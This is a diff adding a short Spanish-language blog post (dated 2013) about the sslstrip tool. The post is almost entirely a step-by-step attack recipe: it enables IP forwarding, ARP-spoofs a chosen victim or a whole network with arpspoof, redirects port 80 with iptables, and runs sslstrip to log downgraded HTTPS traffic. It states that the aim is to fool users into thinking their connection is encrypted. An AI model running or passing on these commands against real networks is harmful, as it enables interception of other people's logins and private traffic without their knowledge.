@@ -1,0 +1,35 @@
+---
+layout: post
+title: "sslstrip"
+date: 2013-12-27 19:44
+comments: true
+categories: 
+---
+Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP]. 
+
+Configuración de reenvío de paquetes IP: 
+
+>\# echo 1 > /proc/sys/net/ipv4/ip_forward 
+
+Envenenamiento ARP (paquete dsniff): 
+
+>\# arpspoof -i eth0 -t ip_victima ip_router 
+
+En caso de querer atacar toda la red, solo especificar la ip router: 
+
+>\# arpspoof -i eth0 ip_router 
+
+Redirección de puertos usando Iptables: 
+
+>\# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 31715 
+
+Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar "-A" por un "-D" en el comando anterior. 
+
+Arrancar sslstrip y ponerlo a la escucha: 
+
+>\# sslstrip -k -f -l 31715 -w archivo.log 
+
+Visionar en tiempo real los paquetes capturados: 
+
+>\#  tail -f archivo.log 
+
